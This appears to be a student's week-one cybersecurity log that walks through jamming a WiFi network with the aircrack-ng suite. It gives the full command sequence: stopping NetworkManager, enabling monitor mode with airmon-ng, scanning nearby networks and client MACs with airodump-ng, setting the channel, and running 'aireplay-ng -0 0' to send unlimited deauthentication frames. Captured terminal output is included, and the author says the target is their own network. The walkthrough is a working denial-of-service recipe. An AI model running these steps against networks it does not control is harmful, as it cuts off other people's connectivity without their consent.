# Week-One-Cybesecurity
We were covering perfoming close to a DDOS attack and jamming a network

# Prerequisites of this realm

Computer Hacking is a Science as well as an Art. Like any other expertise,
you need to put a lot of effort in order to acquire knowledge and become an expert hacker.
Once you are on the track, you would need more effort to keep up-to-date with latest technologies,
new vulnerabilities and exploitation techniques.

An ethical hacker must be a computer systems expert and needs to have very strong programming and computer networking skills.

An ethical hacker needs to have a lot of patience, persistence,
and perseverance to try again and again and wait for the required result.

Additionally, an ethical hacker should be smart enough to understand the situation
and other users’ mind-set in order to apply social engineering exploits.
A good ethical hacker has great problem-solving skills too.

# Bourne shell?

The Bourne shell is a shell command-line interpreter for computer operating systems. The Bourne shell was the default shell for Version 7 Unix. Unix-like systems continue to have —which will be the Bourne shell, or a symbolic link or hard link to a compatible shell—even when other shells are used by most users. Developed by Stephen Bourne at Bell Labs

# What did we do today, really?

Today we managed to launch a low level network DOS(Denial or service) attack by using a simple tool that comes pre-installed
in Kali, Parrot or any pen-testing oriented distro.

# what is aircrack-ng?

Aircrack-ng is a complete suite of tools to assess WiFi network security.

It focuses on different areas of WiFi security:

    - Monitoring: Packet capture and export of data to text files for further processing by third party tools
    - Attacking: Replay attacks, deauthentication, fake access points and others via packet injection
    - Testing: Checking WiFi cards and driver capabilities (capture and injection)
    - Cracking: WEP and WPA PSK (WPA 1 and 2)

All tools are command line which allows for heavy scripting. A lot of GUIs have taken advantage of this feature. It works primarily Linux but also Windows, OS X, FreeBSD, OpenBSD, NetBSD, as well as Solaris and even eComStation 2.

<sourced from "http://aircrack-ng.org/">

# whats an IP address?

an IP address is a network-unique special number combination given to your device when it connects to a network.

# How can i see my IP address?

On windows, you can go to the WIFI settings or simply type the command >"ipconfig" on the shell
On Unix based systems use the command "ifconfig" weird right? wtf is the f for?

# How to Jam a network using aircrack-ng (eakrak dash en gee)

well first thing is to dicover the bssid of the device hosting the network or the router.
the bssid can also be called the Hardware ID or MAC address, whichever is right
we are going to jam my network again, Agu

## The command is "ifconfig" on my machine below shows three interfaces, ignore "lo", so we are left with two.

❯ ifconfig
enp3s0: flags=4099<UP,BROADCAST,MULTICAST> mtu 1500
ether 14:fe:b5:9b:80:69 txqueuelen 1000 (Ethernet)
RX packets 0 bytes 0 (0.0 B)
RX errors 0 dropped 0 overruns 0 frame 0
TX packets 0 bytes 0 (0.0 B)
TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536
inet 127.0.0.1 netmask 255.0.0.0
inet6 ::1 prefixlen 128 scopeid 0x10<host>
loop txqueuelen 1000 (Local Loopback)
RX packets 1580 bytes 154980 (154.9 KB)
RX errors 0 dropped 0 overruns 0 frame 0
TX packets 1580 bytes 154980 (154.9 KB)
TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0

wlp1s0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500
inet 192.168.43.70 netmask 255.255.255.0 broadcast 192.168.43.255
inet6 fe80::19c5:3b12:fc2:e414 prefixlen 64 scopeid 0x20<link>
ether 00:25:d3:c8:15:9f txqueuelen 1000 (Ethernet)
RX packets 22987 bytes 27371890 (27.3 MB)
RX errors 0 dropped 0 overruns 0 frame 0
TX packets 17618 bytes 2245875 (2.2 MB)
TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0

~ via 🐍 v2.7.17 on ☁️ (Oregen)
❯

our target is "wlp1s0" which is my wireless interface card or simply the WIFI card.

Okay, now we know the card we are going to use, the key about jamming networks on this level is to send a deauthanticate
request to the Router for all devices a sizable amount of time to cause a network outage.

Usually the "NetworkManager" process on your Unix machine allows you to run your wifi interface in the controlled mode,
to perform this hack stop this service using the command
"sudo service NetworkManager stop"

Great, so after this you will notice that your WIFI is gone, and the manger on your hotbar is also gone, dont worry, this can be reversed by restarting the service and switching the card back to the monitor mode.

use the command "airmon-ng start wlp1s0" to discover any other processes that might hinder the hack
note here that "wlp1s0" is my network interface card, use yours.
This command will output the following on my machine

---

Found 5 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to run 'airmon-ng check kill'

PID Name
1205 wpa_supplicant
1207 NetworkManager
1243 avahi-daemon
1371 avahi-daemon
2773 dhclient

PHY Interface Driver Chipset

phy0 wlp1s0 ath9k Qualcomm Atheros AR9285 Wireless Network Adapter (PCI-Express) (rev 01)

    	(mac80211 monitor mode vif enabled for [phy0]wlp1s0 on [phy0]wlp1s0mon)
    	(mac80211 station mode vif disabled for [phy0]wlp1s0)

--
to stop those processes use:
kill _pid_
e.g "kill 1207" above will kill or stop the network manager

--

Alright now we run "airodump-ng" basically this command will dump all the networks around into STD_OUT
kinda like this:

---

CH 1 ][ Elapsed: 0 s ] 2021-02-12 21:48

BSSID PWR Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID

D8:32:14:72:73:F9 -88 2 0 0 6 54e. WPA2 CCMP PSK **\*\***  
 50:0F:F5:F8:3A:29 -87 2 0 0 11 54e. WPA2 CCMP PSK **\***
E4:AB:89:AA:78:EC -87 2 0 0 5 54e. WPA2 CCMP PSK **\***  
 50:0F:F5:F8:39:49 -90 2 0 0 8 54e. WPA2 CCMP PSK \*\*\*\*

02:08:22:08:69:09 -53 8 0 0 5 54e WPA2 CCMP PSK Agu

E8:DE:27:59:32:40 -79 4 22 6 2 54e. WPA2 CCMP PSK \*\*\*\*\*

BSSID STATION PWR Rate Lost Frames Probe

(not associated) 80:19:67:E9:B7:30 -59 0 - 1 1 4  
 E8:DE:27:59:32:40 AE:25:B7:81:DE:9A -1 1e- 0 0 9  
 E8:DE:27:59:32:40 70:9F:A9:65:40:A3 -88 0 - 1 0 1  
 E8:DE:27:59:32:40 CC:3B:27:44:88:2A -64 2e- 1 221 15

---

## Please note out target Agu at bssid "02:08:22:08:69:09" and channel "5"

---

Now we have all we need

    (The MAC address of the host)
    (The name of the interface to use(This tends to change when you use aircrack-ng))
    (Channel that the router is broadcasting at)

the next and second last command is:
"iwconfig wlp1s0mon channel 5"

this command will configure our interface card to run on channel 5

## The final command

"aireplay-ng -0 0 -a 02:08:22:08:69:09 wlp1s0mon"

the "-0" parameter stands for the type of signal which is deauth

0 is the number of times which equal to infinity

and "-a" is the mac address

then finally the interface

press enter and this will jam the network indefinately

---

root@Inspiron-N4110:/# aireplay-ng -0 0 -a 02:08:22:08:69:09 wlp1s0mon
22:08:33 Waiting for beacon frame (BSSID: 02:08:22:08:69:09) on channel 5
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
22:08:33 Sending DeAuth to broadcast -- BSSID: [02:08:22:08:69:09]
22:08:34 Sending DeAuth to broadcast -- BSSID: [02:08:22:08:69:09]
22:08:34 Sending DeAuth to broadcast -- BSSID: [02:08:22:08:69:09]
22:08:35 Sending DeAuth to broadcast -- BSSID: [02:08:22:08:69:09]
22:08:35 Sending DeAuth to broadcast -- BSSID: [02:08:22:08:69:09]
22:08:35 Sending DeAuth to broadcast -- BSSID: [02:08:22:08:69:09]
22:08:36 Sending DeAuth to broadcast -- BSSID: [02:08:22:08:69:09]
22:08:36 Sending DeAuth to broadcast -- BSSID: [02:08:22:08:69:09]
